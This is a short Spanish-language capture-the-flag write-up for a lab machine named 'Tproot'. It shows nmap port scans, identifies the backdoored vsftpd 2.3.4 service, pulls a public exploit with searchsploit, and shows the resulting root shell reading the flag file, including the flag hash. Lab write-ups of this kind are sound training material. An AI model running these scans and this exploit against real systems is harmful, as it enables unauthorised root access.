# Tproot

## Reconocimiento

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

nmap -sCV -p21,80 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Vemos que usa vsftpd 2.3.4, que es vulnerable a un backdoor que permite ejecutar comandos como root. 

## Explotación

```bash
searsploit vsftpd 2.3.4 backdoor
searchsploit -m unix/remote/49757.py
```

```bash
whoami
root
cd /root
ls
root.txt
cat root.txt
261fd3f32200f950f231816b4e9a0594
```

Esta máquina es vulnerable a un backdoor en vsftpd 2.3.4, que nos permite obtener acceso como root y leer el archivo root.txt, muy fácil de explotar.